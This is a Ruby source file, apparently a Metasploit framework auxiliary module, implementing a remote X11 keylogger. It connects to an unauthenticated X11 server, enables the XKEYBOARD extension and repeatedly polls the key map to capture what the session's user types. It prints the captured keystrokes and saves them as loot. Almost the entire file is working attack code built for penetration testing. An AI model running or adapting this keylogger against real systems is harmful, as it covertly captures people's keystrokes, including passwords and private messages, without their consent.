##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Exploit::Remote::Tcp
  include Exploit::Remote::X11
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'X11 Keylogger',
        'Description' => %q{
          This module binds to an open X11 host to log keystrokes. This is a fairly
          close copy of the old xspy c program which has been on Kali for a long time.
          The module works by connecting to the X11 session, creating a background
          window, binding a keyboard to it and creating a notification alert when a key
          is pressed.

          One of the major limitations of xspy, and thus this module, is that it polls
          at a very fast rate, faster than a key being pressed is released (especially before
          the repeat delay is hit). To combat printing multiple characters for a single key
          press, repeat characters arent printed when typed in a very fast manor. This is also
          an imperfect keylogger in that keystrokes arent stored and forwarded but status
          displayed at poll time. Keys may be repeated or missing.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'h00die', # MSF module, X11 libs
          'nir tzachar' # original file? https://gitlab.com/kalilinux/packages/xspy/-/blob/kali/master/Xspy.c?ref_type=heads
        ],
        'References' => [
          [ 'URL', 'https://www.kali.org/tools/xspy/'],
          [ 'CVE', '1999-0526']
        ],
        'DefaultOptions' => {
          'RPORT' => 6000
        },
        'DisclosureDate' => '1997-07-01', # CVE date, but likely older
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [],
          'AKA' => ['xspy'],
          'RelatedModules' => [
            'auxiliary/scanner/x11/open_x11',
          ]
        }
      )
    )
    register_options [
      OptInt.new('ListenerTimeout', [ true, 'The maximum number of seconds to keylog', 600 ]) # 10 minutes
    ]
  end

  def check
    vprint_status('Establishing TCP Connection')
    connect # tcp connection establish
    vprint_status('Attempting X11 connection')
    sock.put(X11ConnectionRequest.new.to_binary_s) # x11 session establish
    connection = process_initial_connection_response(sock.get_once(-1, 1))
    if connection.success == 1
      return Exploit::CheckCode::Appears('Successfully established X11 connection')
    end

    Exploit::CheckCode::Safe('X11 connection was not successful')
  end

  def process_initial_connection_response(packet)
    begin
      connection = X11ConnectionResponse.read(packet)
    rescue EOFError
      vprint_bad("Connection packet malformed (size: #{packet.length}), attempting to get read more data")
      packet += sock.get_once(-1, 1)
      begin
        connection = X11ConnectionResponse.read(packet)
      rescue StandardError
        fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to parse X11 connection initialization response packet')
      end
    end
    connection
  end

  def process_extension_query(packet, extension)
    begin
      extension_response = X11QueryExtensionResponse.read(packet)
    rescue ::EOFError
      packet += sock
      fail_with(Msf::Module::Failure::UnexpectedReply, "Unable to process QueryExtension Response. Raw packet: #{packet}")
    end

    if extension_response.present == 1
      print_good("  Extension #{extension} is present with id #{extension_response.major_opcode}")
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, "Extension #{extension} is NOT present (#{packet.inspect})")
    end
    extension_response
  end

  # This function takes map data and converts it to a hashtable so that
  # we can translate from x11 key press data to the actual key on the
  # keyboard which was pressed.
  # https://stackoverflow.com/a/28258750 has a good description of keysyms vs keycodes
  def build_sym_key_map(map_data)
    keysym_index = 0
    key_map = {}
    (map_data.min_key_code..map_data.max_key_code).each do |key_code|
      syms = map_data.key_map_array[keysym_index]
      if syms.n_syms == 0
        key_map[key_code] = nil
      else
        sym = map_data.key_map_array[keysym_index].key_sym_array[0].syms
        begin
          character = sym.chr
          character = '[space]' if character == ' '
        rescue RangeError
          if X11KEYSYM_HASH.key? sym
            character = X11KEYSYM_HASH[sym]
          else
            character = "Unknown key sym: #{sym}"
          end
        end
        key_map[key_code] = character
        # leaving in for debugging purposes
        # puts "i: #{key_code}, keysym_str: #{character}, keysym: #{keysym_index}"
      end
      keysym_index += 1
    end
    key_map
  end

  # TBH still don't really understand exactly how this works, but it does.
  def print_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array)
    # Iterate through each byte of keyboard state
    bit_array_of_keystrokes.each_with_index do |keyboard_state_byte, byte_index|
      next if last_key_press_array[byte_index] == keyboard_state_byte

      # Check each bit within the byte
      8.times do |j|
        next unless keyboard_state_byte & (1 << j) != 0

        # Key at position (i*8 + j) is pressed
        keycode = byte_index * 8 + j

        keysym = key_map[keycode]
        print_line(keysym)
        @keylogger_log += keysym
      end
    end
  end

  def run
    query_extension_calls = 0
    @keylogger_log = ''

    vprint_status('Establishing TCP Connection')
    connect # tcp connection establish
    vprint_status('[1/9] Establishing X11 connection')
    sock.put(X11ConnectionRequest.new.to_binary_s) # x11 session establish
    data = sock.get_once(-1, 1)
    fail_with(Msf::Module::Failure::UnexpectedReply, 'Port connected, but no response to X11 connection attempt') if data.nil?
    connection = process_initial_connection_response(data)
    if connection.success == 1
      print_good('Successly established X11 connection')
    else
      fail_with(Msf::Module::Failure::UnexpectedReply, 'Failed to establish an X11 connection')
    end
    print_connection_info(connection, datastore['RHOST'], datastore['RPORT'])

    vprint_status('[2/9] Checking on BIG-REQUESTS extension')
    sock.put(X11QueryExtensionRequest.new(extension: 'BIG-REQUESTS', unused2: query_extension_calls).to_binary_s) # check if BIG-REQUESTS exist, not sure why
    query_extension_calls += 1
    big_requests_plugin = process_extension_query(sock.get_once(-1, 1), 'BIG-REQUESTS')

    vprint_status('[3/9] Enabling BIG-REQUESTS')
    sock.put(X11ExtensionToggleRequest.new(opcode: big_requests_plugin.major_opcode).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    vprint_status('[4/9] Creating new graphical context')
    sock.put(X11CreateGraphicalContextRequest.new(cid: connection.resource_id_base,
                                                  drawable: connection.screen_root,
                                                  gc_value_mask_background: 1).to_binary_s +
             X11GetPropertyRequest.new(window: connection.screen_root).to_binary_s) # not sure why we do this
    sock.get_once(-1, 1)

    vprint_status('[5/9] Checking on XKEYBOARD extension')
    sock.put(X11QueryExtensionRequest.new(extension: 'XKEYBOARD', unused2: query_extension_calls).to_binary_s) # check if XKEYBOARD exist, not sure why
    xkeyboard_plugin = process_extension_query(sock.get_once(-1, 1), 'XKEYBOARD')

    vprint_status('[6/9] Enabling XKEYBOARD')
    sock.put(X11ExtensionToggleRequest.new(opcode: xkeyboard_plugin.major_opcode, wanted_major: 1).to_binary_s) # use keyboard
    sock.get_once(-1, 1)

    vprint_status('[7/9] Requesting XKEYBOARD map')
    sock.put(X11GetMapRequest.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                  full_key_types: 1,
                                  full_key_syms: 1,
                                  full_modifier_map: 1).to_binary_s) # not sure what this does
    map_data = X11GetMapReply.read(sock.get_once(-1, 1))

    vprint_status('[8/9] Enabling notification on keyboard and map')
    sock.put(X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                 affect_which_new_keyboard_notify: 1,
                                 affect_new_keyboard_key_codes: 1,
                                 affect_new_keyboard_device_id: 1).to_binary_s +
                              X11SelectEvents.new(xkeyboard_id: xkeyboard_plugin.major_opcode,
                                                  affect_which_map_notify: 1,
                                                  affect_map_key_types: 1,
                                                  affect_map_key_syms: 1,
                                                  affect_map_modifier_map: 1,
                                                  map_key_types: 1,
                                                  map_key_syms: 1,
                                                  map_modifier_map: 1).to_binary_s) # not sure what this does
    sock.get_once(-1, 1)

    vprint_status('[9/9] Creating local keyboard map')
    key_map = build_sym_key_map(map_data)
    last_key_press_array = Array.new(32, 0)
    empty = Array.new(32, 0)

    print_good('All setup, watching for keystrokes')
    # loop mechanics stolen from exploit/multi/handler
    stime = Time.now.to_f
    timeout = datastore['ListenerTimeout'].to_i
    begin
      loop do
        break if timeout > 0 && (stime + timeout < Time.now.to_f)

        sock.put(X11QueryKeyMapRequest.new.to_binary_s)
        bit_array_of_keystrokes = X11QueryKeyMapReply.read(sock.get_once(-1, 1)).data
        # we poll FAR quicker than a normal key press, so we need to filter repeats
        next if bit_array_of_keystrokes == last_key_press_array # skip repeats

        print_keystroke(bit_array_of_keystrokes, key_map, last_key_press_array) unless bit_array_of_keystrokes == empty
        last_key_press_array = bit_array_of_keystrokes
      end
    ensure
      vprint_status('Closing X11 connection')
      sock.put(X11FreeGraphicalContextRequest.new(gc: connection.resource_id_base).to_binary_s +
        X11GetInputFocusRequest.new.to_binary_s)
      disconnect

      unless @keylogger_log == ''
        loot_path = store_loot(
          'x11.keylogger',
          'text/plain',
          datastore['rhost'],
          @keylogger_log,
          'xspy.txt',
          'Keylogger content from X11'
        )

        print_good("Logged keys stored to: #{loot_path}")
      end
    end
  end
end
